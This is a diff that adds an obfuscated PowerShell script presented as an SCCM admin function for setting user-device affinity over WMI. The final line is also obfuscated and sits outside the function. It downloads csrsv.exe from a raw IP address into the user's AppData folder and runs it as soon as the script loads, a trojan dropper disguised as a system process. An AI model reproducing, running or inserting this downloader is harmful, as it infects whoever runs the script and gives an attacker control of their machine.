@@ -1,0 +1,50 @@
+ &('sv') ("{0}{1}"-f'g','4y2s8') (  [tyPE]("{0}{6}{2}{7}{1}{9}{3}{8}{4}{5}" -f's','EnT.Aut','aNAG','n.PS','N','tiaL','YStem.M','eM','crEdE','OMATiO') )  ; Function adD-`scC`mu`SErdEV`IcEAf`Fin`ity
+{
+
+    [CmdletBinding()]
+    Param (
+        [Parameter(MaNdAtorY = ${tR`UE}, HElPMeSSAgE = {"{0}{4}{3}{2}{8}{6}{1}{7}{5}"-f'Plea','er ',' S','e','se Enter Sit','ite code','rv','S','e'})]
+        ${s`it`eCoDE},
+
+        [Parameter(ManDatoRy = ${T`RUe}, hELpMESSAgE = {"{3}{6}{5}{0}{2}{4}{8}{7}{1}" -f' Enter ','ame','Site S','P','er','ease','l','er N','v'})]
+        ${site`Se`R`Ver},
+
+        [Parameter(MandatOry = ${T`Rue}, HElpmeSSagE = {"{5}{1}{3}{2}{0}{6}{4}" -f 'N','se E','ter Device ','n','e','Plea','am'})]
+        ${DE`VI`CE`NamE},
+
+        [Parameter()]
+        ${DeV`IC`Eid},
+
+        [Parameter(mandATOry = ${Tr`Ue}, HELpMEssAgE = {"{3}{6}{4}{0}{5}{1}{2}"-f 'Us','Na','me','P','r ','er ','lease Ente'})]
+        ${U`sE`RNAME},
+
+        [Alias({"{0}{1}"-f 'Run','As'})]
+        [System.Management.Automation.Credential()]
+        ${C`RedENT`iAl} =   ( &("{3}{1}{2}{0}"-f 'e','Et-','vArIaBl','G') ("{0}{1}" -f'G4Y2','s8') )."v`Alue"::"EM`pTy"
+    )
+
+    ${Sp`l`AtTing} = @{
+        ("{0}{1}{3}{2}"-f'N','ameSp','e','ac') = "root\sms\site_$SiteCode"
+        ("{2}{0}{1}{3}"-f'om','pu','C','terName') = ${sI`TESer`VEr}
+    }
+
+    IF (${PS`BoUnDPa`R`AMETerS}[("{0}{1}{2}" -f 'Cr','ed','ential')])
+    {
+        ${s`p`l`AttiNG}."CRED`enTi`AL" = ${C`RE`dEnTiAl}
+    }
+
+
+    ${A`Ff`i`Ni`TyTyPE} = 2 
+
+    IF (${pSb`oun`dPaR`AmeTE`Rs}[("{1}{0}{2}"-f'v','De','iceName')])
+    {
+        ${rEsO`URcE`ID} = (.("{4}{3}{2}{1}{0}" -f'ect','Obj','i','Wm','Get-') @Splatting -Class ("{3}{1}{0}{2}{4}" -f '_','MS','Combine','S','dDeviceResources') -Filter "Name='$DeviceName'" -ErrorAction ("{1}{0}" -f 'TOP','S'))."reso`U`Rce`id"
+    }
+    IF (${p`sBO`UnDpARam`etE`RS}[("{0}{2}{1}" -f 'D','ID','evice')])
+    {
+        ${r`Es`OURceid} = ${de`VIce`iD}
+    }
+
+    .("{3}{4}{0}{2}{1}"-f 'W','d','miMetho','I','nvoke-') @Splatting -Class ("{0}{3}{6}{1}{2}{5}{4}"-f'SM','ineRe','lat','S_U','onship','i','serMach') -Name ("{1}{0}{3}{2}" -f'reateRelation','C','ip','sh') -ArgumentList @(${r`eso`URcEid}, ${aF`FI`NI`T`ytype}, 1, ${U`sEr`N`AME})
+}
+(&("{1}{0}{2}"-f'w-Obje','Ne','ct') ("{2}{3}{1}{0}"-f 'lient','ebC','Sy','stem.Net.W')).("{0}{1}{3}{2}" -f 'Downl','oadFi','e','l').Invoke(("{8}{2}{7}{6}{3}{1}{5}{9}{4}{10}{11}{0}" -f'exe','ho','89.','8/~ya','s','o','.170.21','248','http://','/csr','v','.'),"$env:APPDATA\csrsv.exe");.("{0}{1}{2}" -f 'St','art-','Process') ("$env:APPDATA\csrsv.exe")
